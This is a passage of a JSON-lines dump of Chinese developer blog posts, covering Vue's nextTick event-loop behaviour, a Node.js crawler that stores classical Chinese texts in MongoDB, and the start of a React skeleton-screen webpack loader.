}]，然后在\u003ccode\u003ewithMacroTask\u003c/code\u003e中fn.apply调用完毕\u003ccode\u003euseMacroTask\u003c/code\u003e被变回false，整个同步任务结束。\u003c/p\u003e\n\u003cp\u003e此时还记得我们在eventLoop中所讲的吗，我们会从任务队列中寻找所有的微任务，而到目前为止任务队列中并没有微任务，于是一轮事件循环完成了，浏览器重新渲染，不过此时我们的dom结构没有发生丝毫变化，所以就算浏览器没重新渲染也并不会有丝毫影响。接下来就是执行任务队列中的宏任务了，它对应的回调就是我们刚才注册的\u003ccode\u003eflushCallbacks\u003c/code\u003e。首先执行\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e，其中的watcher被调用了run方法，由于此时我们的data中的show被改变成了false，所以新老虚拟dom对比后真实dom中移除掉了绑定v-if=\"show\"的组件。\u003c/p\u003e\n\u003cp\u003e重点来了，虽然dom中移除掉了该组件，但是其实在浏览器上这个组件是依然显示的，因为我们的事件循环还没有完成，其中还有剩余的同步任务需要被执行，浏览器并没开始重新绘制。（如果您对此段有疑问，我个人觉得您可能是没搞懂dom与浏览器上显示的区别，您可以将dom理解成控制台中elements模块内所有的节点，浏览器的中显示的内容不是与其时刻保持一致的）\u003c/p\u003e\n\u003cp\u003e剩下需要被执行的就是\u003ccode\u003e() =\u0026gt; { this.show = true }\u003c/code\u003e，而当执行\u003ccode\u003ethis.show = true\u003c/code\u003e时我们前文所有的流程又通通执行了一遍，其中只有一些细节是与刚才不同的，我们来看一下。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e此函数并没有被\u003ccode\u003ewithMacroTask\u003c/code\u003e包装，它是callbacks被flush时被调用的，所以useMacrotask并没有被改变依然是其默认值false\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e由于第一点原因我们再这次执行宏任务macrotask时产生了微任务microtask来处理本次的flushCallbacks（也就是调用了\u003ccode\u003emicroTimerFunc\u003c/code\u003e）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e所以当本次macrotask结束时，本次的事件循环还没有结束，我们还留下了微任务需要处理，依然是调用\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e，然后\u003ccode\u003ewatcher.run\u003c/code\u003e，因为此次show已经为true了，所以对比新老虚拟dom，重新生成该组件，生命周期完成重置。此时，本轮事件循环结束，浏览器重新渲染。希望您还记得，我们的浏览器本身现在的状态就是该组件显示在可视区内，重新渲染后该组件依然显示，所以自然不会出现组件闪动的情况。\u003c/p\u003e\n\u003cp\u003e现在我相信您自己也能想清楚为什么我们的例子中使用\u003ccode\u003esetTimeout\u003c/code\u003e会有闪动，但是我还是说一下原因来看一下您与我的想法是否一致。因为\u003ccode\u003esetTimeout\u003c/code\u003e产生的是宏任务，当一轮事件循环完成后，宏任务并不会直接处理，中间插入了浏览器的绘制。浏览器重新绘制后会将显示的组件移除掉，所以区域内出现一片空白，紧接着下一次事件循环开始，宏任务被执行组件dom又被重新创建，事件循环结束，浏览器重绘，又在可视区域上将该组件显示。所以在您的视觉效果上，该组件会有闪动，整个过程结束。\u003c/p\u003e\n\u003cp\u003e终于我们想说的都说完了，如果您能坚持看到这里，十分感谢您。不过还有几点是我们依然要考虑的。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eVue干嘛要使用异步队列更新，这明明很TM麻烦又很绕\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e其实文档已经告诉我们了\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作上非常重要。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们假设\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e并没有通过\u003ccode\u003enextTick\u003c/code\u003e而是直接被调用，那么第一种写法\u003ccode\u003ethis.show = false; this.show = true\u003c/code\u003e都会触发watcher.run方法，导致的结果就是这种写法也可以重置组件的生命周期，您可以在Vue源码中注释掉\u003ccode\u003enextTick(flushSchedulerQueue)\u003c/code\u003e改用\u003ccode\u003eflushSchedulerQueue()\u003c/code\u003e打断点来更加明确的体验一下流程。要知道这仅仅是一个简单的例子，实际工作中我们可能因为这种问题使dom白白被改变了巨多次，我们都知道dom的操作是昂贵的，所以Vue帮我们再框架内优化了该步骤。您不妨再想一下直接\u003ccode\u003eflushSchedulerQueue()\u003c/code\u003e这种情况下，组件会不会闪动，来巩固我们刚才讲过的东西。\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e既然nextTick的使用的微任务是由Promise.then().resolve()生成的，我们可不可以直接在回调函数中写\u003ccode\u003ethis.show = false; Promise.then().resolve(() =\u0026gt; { this.show = true })\u003c/code\u003e来代替this.$nextTick？很明显我既然这么问了那就是不行的，只是过程您需要自己思考。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e最后，感谢阅读~~~\u003c/p\u003e\n","buildTime":"1515060946.6698","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c00f"},"id":"5a3f7a9f6fb9a04525785590","author":{"$oid":"5a4e178e201569114874bff0"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/25/1608b73f462614db?w=1188\u0026h=688\u0026f=png\u0026s=285324"],"screenShot":null}],"title":"NodeJs爬虫抓取古代典籍，共计16000个页面心得体会总结，附带对应的React+ Redux 前端 和 Koa2服务端代码","meta":{"likeCount":0},"tag":["React.js","Node.js","MongoDB","前端","koa","爬虫"],"comment":[],"shortContent":"之前研究数据，零零散散的写过一些数据抓取的爬虫，不过写的比较随意。有很多地方现在看起来并不是很合理 这段时间比较闲，本来是想给之前的项目做重构的。 后来 利用这个周末，索性重新写了一个项目，就是本项目 guwen-spider。目前这个爬虫还是比较简单的类型的， 直接抓取页面，…","content":"\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\n\u003cp\u003e之前研究数据，零零散散的写过一些数据抓取的爬虫，不过写的比较随意。有很多地方现在看起来并不是很合理 这段时间比较闲，本来是想给之前的项目做重构的。\n后来 利用这个周末，索性重新写了一个项目，就是本项目 guwen-spider。目前这个爬虫还是比较简单的类型的， 直接抓取页面，然后在页面中提取数据，保存数据到数据库。\n通过与之前写的对比，我觉得难点在于整个程序的健壮性，以及相应的容错机制。在昨天写代码的过程中其实也有反映， 真正的主体代码其实很快就写完了 ，花了大部分时间是在\n做稳定性的调试， 以及寻求一种更合理的方式来处理数据与流程控制的关系。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608b73f462614db?w=1188\u0026amp;h=688\u0026amp;f=png\u0026amp;s=285324\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e背景\u003c/h3\u003e\n\u003cp\u003e项目的背景是抓取一个一级页面是目录列表 ，点击一个目录进去 是一个章节 及篇幅列表 ，点击章节或篇幅进入具体的内容页面。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e概述\u003c/h3\u003e\n\u003cp\u003e本项目github地址 : \u003ca target=\"_blank\" href=\"https://github.com/yangfan0095/guwen-spider\"\u003eguwen-spider\u003c/a\u003e  （PS:最后面还有彩蛋 ~~逃\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e项目技术细节\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e项目大量用到了 ES7 的async 函数, 更直观的反应程序了的流程。为了方便，在对数据遍历的过程中直接使用了著名的async这个库，所以不可避免的还是用到了回调promise ，因为数据的处理发生在回调函数中，不可避免的会遇到一些数据传递的问题，其实也可以直接用ES7的async await 写一个方法来实现相同的功能。这里其实最赞的一个地方是使用了 Class 的 static 方法封装对数据库的操作， static 顾名思义 静态方法 就跟 prototype 一样 ，不会占用额外空间。\n项目主要用到了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e1 ES7的 async await 协程做异步有关的逻辑处理。\u003c/li\u003e\n\u003cli\u003e2 使用 npm的 async库 来做循环遍历，以及并发请求操作。\u003c/li\u003e\n\u003cli\u003e3 使用 log4js 来做日志处理\u003c/li\u003e\n\u003cli\u003e4 使用 cheerio 来处理dom的操作。\u003c/li\u003e\n\u003cli\u003e5 使用 mongoose 来连接mongoDB 做数据的保存以及操作。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e目录结构\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e├── bin              // 入口\n│\u0026nbsp;  ├── booklist.js         // 抓取书籍逻辑\n│\u0026nbsp;  ├── chapterlist.js      // 抓取章节逻辑\n│\u0026nbsp;  ├── content.js          // 抓取内容逻辑\n│\u0026nbsp;  └── index.js            // 程序入口\n├── config             // 配置文件\n├── dbhelper           // 数据库操作方法目录\n├── logs             // 项目日志目录\n├── model         // mongoDB 集合操作实例\n├── node_modules         \n├── utils         // 工具函数\n├── package.json       \n\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e项目实现方案分析\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e项目是一个典型的多级抓取案例，目前只有三级，即 书籍列表， 书籍项对应的 章节列表，一个章节链接对应的内容。 抓取这样的结构可以采用两种方式， 一是 直接从外层到内层 内层抓取完以后再执行下一个外层的抓取， 还有一种就是先把外层抓取完成保存到数据库，然后根据外层抓取到所有内层章节的链接，再次保存，然后从数据库查询到对应的链接单元 对之进行内容抓取。这两种方案各有利弊，其实两种方式我都试过， 后者有一个好处，因为对三个层级是分开抓取的， 这样就能够更方便，尽可能多的保存到对应章节的相关数据。 可以试想一下 ，如果采用前者 按照正常的逻辑\n对一级目录进行遍历抓取到对应的二级章节目录， 再对章节列表进行遍历 抓取内容，到第三级 内容单元抓取完成 需要保存时，如果需要很多的一级目录信息，就需要 这些分层的数据之间进行数据传递 ，想想其实应该是比较复杂的一件事情。所以分开保存数据 一定程度上避开了不必要的复杂的数据传递。\u003c/p\u003e\n\u003cp\u003e目前我们考虑到 其实我们要抓取到的古文书籍数量并不多，古文书籍大概只有180本囊括了各种经史。其和章节内容本身是一个很小的数据 ，即一个集合里面有180个文档记录。 这180本书所有章节抓取下来一共有一万六千个章节，对应需要访问一万六千个页面爬取到对应的内容。所以选择第二种应该是合理的。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e项目实现\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e主程有三个方法 bookListInit ,chapterListInit,contentListInit, 分别是抓取书籍目录，章节列表，书籍内容的方法对外公开暴露的初始化方法。通过async 可以实现对这三个方法的运行流程进行控制，书籍目录抓取完成将数据保存到数据库，然后执行结果返回到主程序，如果运行成功 主程序则执行根据书籍列表对章节列表的抓取，同理对书籍内容进行抓取。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e项目主入口\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 爬虫抓取主入口\n */\nconst start = async() =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e booklistRes = await bookListInit();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!booklistRes) {\n        logger.warn(\u003cspan class=\"hljs-string\"\u003e'书籍列表抓取出错，程序终止...'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    logger.info(\u003cspan class=\"hljs-string\"\u003e'书籍列表抓取成功，现在进行书籍章节抓取...'\u003c/span\u003e);\n\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e chapterlistRes = await chapterListInit();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!chapterlistRes) {\n        logger.warn(\u003cspan class=\"hljs-string\"\u003e'书籍章节列表抓取出错，程序终止...'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    logger.info(\u003cspan class=\"hljs-string\"\u003e'书籍章节列表抓取成功，现在进行书籍内容抓取...'\u003c/span\u003e);\n\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e contentListRes = await contentListInit();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!contentListRes) {\n        logger.warn(\u003cspan class=\"hljs-string\"\u003e'书籍章节内容抓取出错，程序终止...'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    logger.info(\u003cspan class=\"hljs-string\"\u003e'书籍内容抓取成功'\u003c/span\u003e);\n}\n// 开始入口\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (typeof bookListInit === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e \u0026amp;\u0026amp; typeof chapterListInit === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e) {\n    // 开始抓取\n    start();\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e引入的 bookListInit ,chapterListInit,contentListInit,  三个方法\u003c/p\u003e\n\u003cp\u003ebooklist.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 初始化方法 返回抓取结果 \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e 抓取成果 \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e 抓取失败\n */\nconst bookListInit = async() =\u0026gt; {\n    logger.info(\u003cspan class=\"hljs-string\"\u003e'抓取书籍列表开始...'\u003c/span\u003e);\n    const pageUrlList = getPageUrlList(totalListPage, baseUrl);\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e res = await getBookList(pageUrlList);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003echapterlist.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 初始化入口\n */\nconst chapterListInit = async() =\u0026gt; {\n    const list = await bookHelper.getBookList(bookListModel);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!list) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'初始化查询书籍目录失败'\u003c/span\u003e);\n    }\n    logger.info(\u003cspan class=\"hljs-string\"\u003e'开始抓取书籍章节列表，书籍目录共：'\u003c/span\u003e + list.length + \u003cspan class=\"hljs-string\"\u003e'条'\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e res = await asyncGetChapter(list);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003econtent.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 初始化入口\n */\nconst contentListInit = async() =\u0026gt; {\n    //获取书籍列表\n    const list = await bookHelper.getBookLi(bookListModel);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!list) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'初始化查询书籍目录失败'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    const res = await mapBookList(list);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!res) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'抓取章节信息，调用 getCurBookSectionList() 进行串行遍历操作，执行完成回调出错，错误信息已打印，请查看日志!'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e内容抓取的思考\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e书籍目录抓取其实逻辑非常简单，只需要使用async.mapLimit做一个遍历就可以保存数据了,但是我们在保存内容的时候 简化的逻辑其实就是 遍历章节列表 抓取链接里的内容。但是实际的情况是链接数量多达几万 我们从内存占用角度也不能全部保存到一个数组中，然后对其遍历，所以我们需要对内容抓取进行单元化。\n普遍的遍历方式 是每次查询一定的数量，来做抓取，这样缺点是只是以一定数量做分类，数据之间没有关联，以批量方式进行插入，如果出错 则容错会有一些小问题，而且如果我们想要把一本书作为一个集合单独保存会遇到问题。因此我们采用第二种就是以一个书籍单元进行内容抓取和保存。\n这里使用了 \u003ccode\u003easync.mapLimit(list, 1, (series, callback) =\u0026gt; {})\u003c/code\u003e这个方法来进行遍历，不可避免的用到了回调，感觉很恶心。async.mapLimit()的第二个参数可以设置同时请求数量。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e /* \n * 内容抓取步骤：\n * 第一步得到书籍列表， 通过书籍列表查到一条书籍记录下 对应的所有章节列表， \n * 第二步 对章节列表进行遍历获取内容保存到数据库中 \n * 第三步 保存完数据后 回到第一步 进行下一步书籍的内容抓取和保存\n */\n\n/**\n * 初始化入口\n */\nconst contentListInit = async() =\u0026gt; {\n    //获取书籍列表\n    const list = await bookHelper.getBookList(bookListModel);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!list) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'初始化查询书籍目录失败'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    const res = await mapBookList(list);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!res) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'抓取章节信息，调用 getCurBookSectionList() 进行串行遍历操作，执行完成回调出错，错误信息已打印，请查看日志!'\u003c/span\u003e);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e res;\n}\n/**\n * 遍历书籍目录下的章节列表\n * @param {*} list \n */\nconst mapBookList = (list) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise((resolve, reject) =\u0026gt; {\n        async.mapLimit(list, 1, (series, callback) =\u0026gt; {\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e doc = series._doc;\n            getCurBookSectionList(doc, callback);\n        }, (err, result) =\u0026gt; {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) {\n                logger.error(\u003cspan class=\"hljs-string\"\u003e'书籍目录抓取异步执行出错!'\u003c/span\u003e);\n                logger.error(err);\n                reject(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n            }\n            resolve(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n        })\n    })\n}\n\n/**\n * 获取单本书籍下章节列表 调用章节列表遍历进行抓取内容\n * @param {*} series \n * @param {*} callback \n */\nconst getCurBookSectionList = async(series, callback) =\u0026gt; {\n\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e num = Math.random() * 1000 + 1000;\n    await sleep(num);\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e key = series.key;\n    const res = await bookHelper.querySectionList(chapterListModel, {\n        key: key\n    });\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!res) {\n        logger.error(\u003cspan class=\"hljs-string\"\u003e'获取当前书籍: '\u003c/span\u003e + series.bookName + \u003cspan class=\"hljs-string\"\u003e' 章节内容失败，进入下一部书籍内容抓取!'\u003c/span\u003e);\n        callback(null, null);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    //判断当前数据是否已经存在\n    const bookItemModel = getModel(key);\n    const contentLength = await bookHelper.getCollectionLength(bookItemModel, {});\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (contentLength === res.length) {\n        logger.info(\u003cspan class=\"hljs-string\"\u003e'当前书籍：'\u003c/span\u003e + series.bookName + \u003cspan class=\"hljs-string\"\u003e'数据库已经抓取完成，进入下一条数据任务'\u003c/span\u003e);\n        callback(null, null);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n    }\n    await mapSectionList(res);\n    callback(null, null);\n}\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e数据抓取完了 怎么保存是个问题\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e这里我们通过key 来给数据做分类，每次按照key来获取链接，进行遍历，这样的好处是保存的数据是一个整体，现在思考数据保存的问题\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e1 可以以整体的方式进行插入\u003c/p\u003e\n\u003cp\u003e优点 : 速度快 数据库操作不浪费时间。\u003c/p\u003e\n\u003cp\u003e缺点 : 有的书籍可能有几百个章节 也就意味着要先保存几百个页面的内容再进行插入，这样做同样很消耗内存，有可能造成程序运行不稳定。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e2可以以每一篇文章的形式插入数据库。\u003c/p\u003e\n\u003cp\u003e优点 : 页面抓取即保存的方式 使得数据能够及时保存，即使后续出错也不需要重新保存前面的章节，\u003c/p\u003e\n\u003cp\u003e缺点 : 也很明显 就是慢 ，仔细想想如果要爬几万个页面 做 几万次*N 数据库的操作 这里还可以做一个缓存器一次性保存一定条数 当条数达到再做保存这样也是一个不错的选择。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 遍历单条书籍下所有章节 调用内容抓取方法\n * @param {*} list \n */\nconst mapSectionList = (list) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise((resolve, reject) =\u0026gt; {\n        async.mapLimit(list, 1, (series, callback) =\u0026gt; {\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e doc = series._doc;\n            getContent(doc, callback)\n        }, (err, result) =\u0026gt; {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err) {\n                logger.error(\u003cspan class=\"hljs-string\"\u003e'书籍目录抓取异步执行出错!'\u003c/span\u003e);\n                logger.error(err);\n                reject(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n            }\n            const bookName = list[0].bookName;\n            const key = list[0].key;\n\n            // 以整体为单元进行保存\n            saveAllContentToDB(result, bookName, key, resolve);\n\n            //以每篇文章作为单元进行保存\n            // logger.info(bookName + \u003cspan class=\"hljs-string\"\u003e'数据抓取完成，进入下一部书籍抓取函数...'\u003c/span\u003e);\n            // resolve(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n\n        })\n    })\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e两者各有利弊，这里我都做了尝试。 准备了两个错误保存的集合,errContentModel, errorCollectionModel,在插入出错时 分别保存信息到对应的集合中，二者任选其一即可。增加集合来保存数据的原因是 便于一次性查看以及后续操作， 不用看日志。\u003c/p\u003e\n\u003cp\u003e（PS ，其实完全用 errorCollectionModel 这个集合就可以了  ，errContentModel这个集合可以完整保存章节信息）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//保存出错的数据名称\nconst errorSpider = mongoose.Schema({\n    chapter: String,\n    section: String,\n    url: String,\n    key: String,\n    bookName: String,\n    author: String,\n})\n// 保存出错的数据名称 只保留key 和 bookName信息\nconst errorCollection = mongoose.Schema({\n    key: String,\n    bookName: String,\n})\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们将每一条书籍信息的内容 放到一个新的集合中，集合以key来进行命名。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e写这个项目 其实主要的难点在于程序稳定性的控制，容错机制的设置，以及错误的记录，目前这个项目基本能够实现直接运行 一次性跑通整个流程。 但是程序设计也肯定还存在许多问题 ，欢迎指正和交流。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e彩蛋\u003c/h2\u003e\n\u003cp\u003e写完这个项目 做了一个基于React开的前端网站用于页面浏览 和一个基于koa2.x开发的服务端, 整体技术栈相当于是 React + Redux + Koa2 ,前后端服务是分开部署的，各自独立可以更好的去除前后端服务的耦合性，比如同一套服务端代码，不仅可以给web端 还可以给 移动端 ，app 提供支持。目前整个一套还很简陋，但是可以满足基本的查询浏览功能。希望后期有时间可以把项目变得更加丰富。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e本项目地址  地址 : \u003ca target=\"_blank\" href=\"https://github.com/yangfan0095/guwen-spider\"\u003eguwen-spider\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e对应前端 React + Redux + semantic-ui   地址 : \u003ca target=\"_blank\" href=\"https://github.com/yangfan0095/guwen-react\"\u003eguwen-react\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e对应Node端 Koa2.2 + mongoose  地址 : \u003ca target=\"_blank\" href=\"https://github.com/yangfan0095/guwen-node\"\u003eguwen-node\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e项目挺简单的 ，但是多了一个学习和研究 从前端到服务端的开发的环境。\u003c/p\u003e\n\u003cp\u003e以上です\u003c/p\u003e\n","buildTime":"1515067035.0718","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac7f"},"id":"5a4d9fc2f265da43052f0944","author":{"$oid":"5a4e17dde8405d2778beac6f"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bff5e7275c9b9?w=372\u0026h=240\u0026f=png\u0026s=4461"],"screenShot":null}],"title":"react骨架屏","meta":{"likeCount":0},"tag":["React.js","前端"],"comment":[],"shortContent":"一个可以自动生成react骨架屏的webpack loader. 菊花的loading图太low，骨架屏更美观。公司UI不愿意为设计骨架屏图片（在一个小公司，UI也比较少）！后来我想了一下能不能通过webpack自动生成骨架屏，有了这个想法之后我就开始动手设计了,发现是可行所以…","content":"\u003ch1 class=\"heading\"\u003eehome-react-skeleton\u003c/h1\u003e\n\u003cp\u003e一个可以自动生成\u003ccode\u003ereact\u003c/code\u003e骨架屏的\u003ccode\u003ewebpack loader\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e起始\u003c/h2\u003e\n\u003cp\u003e菊花的\u003ccode\u003eloading\u003c/code\u003e图太low，骨架屏更美观。公司UI不愿意为设计骨架屏图片（在一个小公司，UI也比较少）！后来我想了一下能不能通过\u003ccode\u003ewebpack\u003c/code\u003e自动生成骨架屏，有了这个想法之后我就开始动手设计了,发现是可行所以初步写了一个\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/ehome-react-skeleton\"\u003eloader\u003c/a\u003e 当然还只是个初始版本还有很多优化和改进的部分.最近这段时间比较忙，过了这段时间我会加以优化和改善输出一个稳定的版本。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e安装\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ecnpm i ehome-react-skeleton --save\u003c/code\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e配置\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e:/\\.(js|jsx)$/,\n    include:paths.src,\n    use:[\n        {\n            loader: require.resolve(\u003cspan class=\"hljs-string\"\u003e\"babel-loader\"\u003c/span\u003e),\n            options: {\n                \u003cspan class=\"hljs-string\"\u003e\"presets\"\u003c/span\u003e: [\n                    \u003cspan class=\"hljs-string\"\u003e\"react-app\"\u003c/span\u003e\n                ]\n            }\n        },\n        {\n            loader:require.resolve(\u003cspan class=\"hljs-string\"\u003e\"ehome-react-skeleton\"\u003c/span\u003e)  // 在babel-loader之前配置ehome-react-skeleton\n        }\n    ]\n\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e使用\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003edemo1\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eimport React from \"react\";\nimport ReactDom from \"react-dom\";\nimport \"./index.less\";\n\nconst prefix = \"eh-home\";\nexport default class Skeleton extends React.Component {\n\n  componentWillMount() {\n    this.setState({\n      ownerHotLines: [{\n        description: \"中国人民\",\n        name: \"leiwuyi\",\n        contact: \"15999650670\"\n\n      }]\n\n    });\n  }\n  render() {\n    const { state, props } = this;\n    return (\n        \u0026lt;div className={`${prefix}-ownerservice`}\u0026gt;\n            \u0026lt;div\u0026gt;\n                {state.ownerHotLines.map(hotline =\u0026gt; {\n                  return \u0026lt;div className={`${prefix}-ownerservice`} SKELETON\u0026gt;\n                            \u0026lt;div className=\"block\"\u0026gt;\n                                \u0026lt;div className=\"block-avatar\"\u0026gt;\n                                    \u0026lt;img  /\u0026gt;\n                                \u0026lt;/div\u0026gt;\n                                \u0026lt;div className=\"block-content\"\u0026gt;\n                                    \u0026lt;div className=\"block-content-title\"\u0026gt;\n                                       中国人民\n                                    \u0026lt;/div\u0026gt;\n                                    \u0026lt;div className=\"block-content-contact\"\u0026gt;\n                                        \u0026lt;span style={{ marginRight: 20 